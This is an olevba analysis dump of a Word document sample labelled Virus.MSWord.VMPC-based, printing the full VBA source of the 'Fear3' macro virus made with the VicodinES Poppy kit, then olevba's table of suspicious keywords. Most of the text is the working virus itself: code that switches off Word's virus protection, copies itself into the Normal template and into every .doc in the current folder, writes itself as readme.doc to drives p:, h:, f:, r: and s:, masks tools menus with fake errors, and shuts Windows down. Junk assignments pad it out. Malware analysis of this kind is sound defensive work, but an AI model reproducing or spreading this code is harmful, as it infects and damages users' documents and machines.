olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.VMPC-based-84406a93c5d13137d3ab36774d6b27a7d8982639
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.VMPC-based-84406a93c5d13137d3ab36774d6b27a7d8982639 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Fear3.bas 
in file: Virus.MSWord.VMPC-based-84406a93c5d13137d3ab36774d6b27a7d8982639 - OLE stream: 'Macros/VBA/Fear3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Public Skip As Integer
    
    
Sub Fear3()
    'The VicodinES Macro.Poppy Construction Kit v1.0c
    '====================================================
    'Code Written by VicodinES---------------------------
    
    'Poppy ID : 730231504152 Compatable with SR-1
    'I Give You ---> Fear3.Poppy !! Dig It !!
    
On Error Resume Next
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "readme.doc"
If sv = 3 Then svt$ = "readme.doc"
If sv = 2 Then svt$ = "readme.doc"
k11945 = m5692 & e5595
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.VBE.ActiveVBProject.VBComponents("Fear3").Export "c:\Fear3.sys"
f15712 = u9559 & c15678 & k17284 & m9559
ActiveDocument.ReadOnlyRecommended = False
f6105 = u18148 & c11856 & Int(Rnd * 3942)
rm = Int(Rnd * 100)
    If rm = 99 Then MsgBox "The FearIII virus LIVES!  created by -Iceman-", vbSystemModal
k10102 = m5117 & e10686
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Fear3" Then sex730231506 = True
Next I
k14160 = m11519 & e17605
f13344 = u10133 & c4800 & Int(Rnd * 2177)
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Fear3" Then not31505 = True
Next I
k10446 = m4215 & e1862
If sex730231506 = True And not31505 = False Then Set s315073026 = NormalTemplate.VBProject.VBComponents
If sex730231506 = False And not31505 = True Then Set s315073026 = ActiveDocument.VBProject.VBComponents
s315073026.import "c:\Fear3.sys"
If sex730231506 = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
k6253 = m12264 & e582
f12521 = u6920 & c5229 & Int(Rnd * 4307)
f18771 = u8487 & c15821 & Int(Rnd * 8389)
If not31505 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
f9987 = u10291 & c11570 & Int(Rnd * 8666)
'VMPCK v1.0c [SR-1 Compatable]
fuckoff:
End Sub
Sub FileNew()
    On Error Resume Next
    Call Fear3
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Fear3
End Sub
Sub FileSave()
    On Error Resume Next
    Call Fear3
    ActiveDocument.Save
f6749 = u8814 & c9574 & Int(Rnd * 4975)
End Sub
Sub FileClose()
    On Error Resume Next
f4725 = u9141 & c13327 & k13005 & m9141
    Call Fear3
f10736 = u13978 & c11451 & Int(Rnd * 5934)
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    Call Fear3
k8411 = m15781 & e10738
k14380 = m15533 & e9746
End Sub
Sub EditFind()
    On Error Resume Next
f3511 = u17337 & c7580 & Int(Rnd * 1284)
Dialogs(wdDialogEditFind).Show
    Call Fear3
k11601 = m16592 & e14420
End Sub
Sub FileSaveAs()
    On Error Resume Next
f10903 = u11182 & c14232 & Int(Rnd * 2462)
k2634 = m13887 & e7945
Dialogs(wdDialogFileSaveAs).Show
    Call Fear3
f2760 = u13651 & c7699 & k1287 & m13651
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
f14962 = u15872 & c15796 & Int(Rnd * 8153)
    Call Fear3
f8879 = u11509 & c7985 & k1479 & m11509
End Sub
Sub FileExit()
    On Error Resume Next
    Call Fear3
    If ActiveDocument.Saved = False Then ActiveDocument.Save
f10391 = u14226 & c6819 & Int(Rnd * 4366)
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Fear3
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Fear3
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
k14724 = m14631 & e10922
k18439 = m11937 & e6666
End Sub
Sub AutoOpen()
    On Error Resume Next
k10255 = m6357 & e15646
    Call Fear3
f11367 = u9299 & c10098 & Int(Rnd * 1644)
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Fear3
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Fear3
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Fear3
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub
Sub AutoExec()
    On Error Resume Next
f17331 = u15297 & c6677 & k13034 & m15297
k10503 = m6526 & e13715
    Call Fear3
f3975 = u5455 & c13446 & Int(Rnd * 7886)
f9747 = u3561 & c9100 & Int(Rnd * 5667)
End Sub
Sub AutoClose()
    On Error Resume Next
k12662 = m10043 & e13872
    Call Fear3
f10498 = u7247 & c8983 & k7228 & m7247
k16940 = m10460 & e2932
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call Fear3
f18128 = u7822 & c18103 & Int(Rnd * 9691)
    Call p421
f9283 = u15442 & c13234 & Int(Rnd * 616)
MsgBox "Word Basic Err =7"
k10475 = m10370 & e17787
End Sub
Sub FileTemplates()
    On Error Resume Next
f11771 = u13233 & c5348 & k7007 & m13233
    Call Fear3
f16508 = u12084 & c7106 & Int(Rnd * 3715)
    Call p421
k10131 = m11271 & e6614
MsgBox "Word Basic Err =7"
f6117 = u13492 & c10928 & Int(Rnd * 105)
End Sub
Sub ViewVBCode()
    On Error Resume Next
f13104 = u13403 & c12330 & k7256 & m13403
    Call Fear3
k14352 = m9378 & e3820
f14890 = u6345 & c16107 & Int(Rnd * 7738)
    Call p421
MsgBox "Word Basic Err =7"
k8383 = m9626 & e14811
f2117 = u2986 & c9980 & k2977 & m2986
End Sub
Sub p421()
    On Error Resume Next
k7696 = m11430 & e12462
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Tasks.ExitWindows
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

